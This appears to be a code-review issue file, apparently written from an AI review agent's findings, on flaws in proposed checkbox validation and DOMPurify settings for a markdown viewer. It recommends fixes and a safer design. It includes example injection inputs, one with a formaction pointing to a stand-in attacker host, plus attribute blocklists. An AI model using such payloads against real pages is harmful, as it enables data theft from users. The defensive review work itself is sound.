---
status: pending
priority: p1
issue_id: "002"
tags: [code-review, security, input-validation]
dependencies: []
---

# Post-Sanitization Validation Has Security Vulnerabilities

## Problem Statement

The plan's proposed post-sanitization validation for `<input>` elements (Options A and B) has multiple security vulnerabilities that could allow malicious inputs to bypass protection.

**Why it matters:**
- Could allow non-checkbox inputs to remain in DOM
- Race condition with async mermaid rendering
- Missing attribute blocklist allows dangerous form attributes
- Violates defense-in-depth security principles

**Severity:** P1 (Critical) - Security vulnerability, blocks merge if Options A/B are chosen

## Findings

**Source:** Data-integrity-guardian agent review

**Current proposed validation** (plan lines 298-306, 351-356):
```javascript
const inputs = content_element.querySelectorAll('input');
inputs.forEach(input => {
  if (input.type !== 'checkbox') {
    input.remove();
  }
  if (!input.hasAttribute('disabled')) {
    input.setAttribute('disabled', 'disabled');
  }
});
```

**Vulnerabilities identified:**

1. **Type property bypass**
   - `input.type` defaults to `"text"` if type attribute is invalid/misspelled
   - Should check `getAttribute('type')` instead of `.type` property

2. **Execution order bug**
   - Checks `disabled` AFTER removing element
   - Removed elements skip disability validation (though this is low-impact)

3. **Missing attribute blocklist**
   - Allows dangerous attributes: `form`, `formaction`, `formmethod`, `name`, `value`, `autofocus`
   - These can submit data or interfere with parent page

4. **Race condition**
   - Validation runs, then async `render_mermaid()` runs
   - If mermaid injects `<foreignObject><input>`, validation already completed

5. **No DOMPurify existence check**
   - Current code assumes `window.DOMPurify` exists
   - If script fails to load, entire sanitization fails silently

## Proposed Solutions

### Solution 1: Fix Validation Logic (Small effort, low risk) ✅

**Approach:**
```javascript
// Run AFTER innerHTML injection, BEFORE any async operations
content_element.innerHTML = sanitized_html;

// Validate synchronously
const inputs = content_element.querySelectorAll('input');
inputs.forEach(input => {
  // Check attribute, not property
  const type = input.getAttribute('type');
  if (type !== 'checkbox') {
    input.remove();
    return;  // Skip further validation
  }

  // Force disabled
  input.setAttribute('disabled', 'disabled');

  // Remove dangerous attributes
  const dangerous_attrs = ['form', 'formaction', 'formmethod', 'name', 'value', 'autofocus'];
  dangerous_attrs.forEach(attr => input.removeAttribute(attr));
});

// Now safe to run async
await render_mermaid();
```

**Pros:**
- Fixes all identified vulnerabilities
- Maintains defense-in-depth approach
- Small code change

**Cons:**
- Still requires expanding DOMPurify allowlist
- Adds complexity vs Option C

**Estimated Effort:** 30 minutes
**Risk:** Low

---

### Solution 2: Enhanced DOMPurify Config (Small effort, low risk) ✅

**Approach:**
```javascript
const sanitized_html = DOMPurify.sanitize(html, {
  ADD_TAGS: ['div', 'section', 'pre', 'input'],
  ADD_ATTR: ['class', 'data-original', 'type', 'disabled', 'checked'],
  FORBID_ATTR: ['form', 'formaction', 'formmethod', 'name', 'value', 'autofocus', 'onclick', 'onerror'],
  ALLOW_UNKNOWN_PROTOCOLS: false  // Block javascript: URLs
});
```

**Pros:**
- Explicit blocklist prevents attribute injection
- DOMPurify handles it before validation runs
- Defense-in-depth

**Cons:**
- Need to verify DOMPurify version supports FORBID_ATTR

**Estimated Effort:** 15 minutes
**Risk:** Low

---

### Solution 3: Add DOMPurify Existence Check (Small effort, low risk) ✅

**Approach:**
```javascript
if (typeof DOMPurify === 'undefined') {
  show_error('Security library not loaded. Cannot render content.');
  return;
}
```

**Pros:**
- Fails safely if DOMPurify script doesn't load
- Uses existing `show_error` pattern

**Cons:**
- None

**Estimated Effort:** 5 minutes
**Risk:** None

---

### Solution 4: Use Option C Instead (No effort, no risk) 🌟

**Approach:**
Choose Option C (Unicode symbols) from the plan - avoids all these vulnerabilities by not using `<input>` elements at all.

**Pros:**
- Zero security vulnerabilities
- No DOMPurify changes needed
- No validation complexity
- Simpler implementation

**Cons:**
- Symbols (☐/☑) instead of native checkboxes
- Different visual appearance (but viewer is read-only anyway)

**Estimated Effort:** 0 (just choose different option)
**Risk:** None (most secure option)

## Recommended Action

**Primary: Choose Option C** to avoid these vulnerabilities entirely.

**If Options A/B required:** Implement Solutions 1, 2, and 3 together for comprehensive protection.

## Technical Details

**Affected Files:**
- `/Users/randallnoval/Code/markpane/src/renderer.js` (lines 159-177 will be modified)
- `/Users/randallnoval/Code/markpane/docs/plans/2026-02-14-feat-gfm-parity-task-lists-and-strikethrough-plan.md`

**Attack Scenarios:**

1. **Type bypass:**
   ```markdown
   - [x] <input typ="text" value="malicious">
   ```
   → `input.type` returns `"text"` (default), validation SHOULD remove it but current logic might miss edge cases

2. **Form submission:**
   ```markdown
   - [x] <input type="checkbox" form="evil" formaction="https://attacker.com">
   ```
   → Could submit data if form exists on page

3. **Mermaid injection:**
   ```markdown
   ```mermaid
   graph TD
       A["<foreignObject><input type='file'></foreignObject>"]
   ```
   ```
   → If mermaid allows foreignObject (it shouldn't with strict mode), validation runs too early

## Acceptance Criteria

- [ ] Validation uses `getAttribute('type')` not `.type` property
- [ ] Dangerous attributes explicitly removed or blocked
- [ ] Validation runs synchronously before async operations
- [ ] DOMPurify existence validated before use
- [ ] FORBID_ATTR configured in DOMPurify config

OR

- [ ] Option C chosen, avoiding all vulnerabilities

## Work Log

### 2026-02-14 - Initial finding
- Identified by data-integrity-guardian review agent
- Multiple critical security vulnerabilities in proposed validation
- Recommendation: Use Option C or implement all three fixes

## Resources

- **Related issue:** N/A (plan review finding)
- **Plan document:** `/Users/randallnoval/Code/markpane/docs/plans/2026-02-14-feat-gfm-parity-task-lists-and-strikethrough-plan.md`
- **Current DOMPurify config:** `/Users/randallnoval/Code/markpane/src/renderer.js:159-162`
- **Agent report:** data-integrity-guardian (agent ID: ac8a784)
- **DOMPurify docs:** https://github.com/cure53/DOMPurify
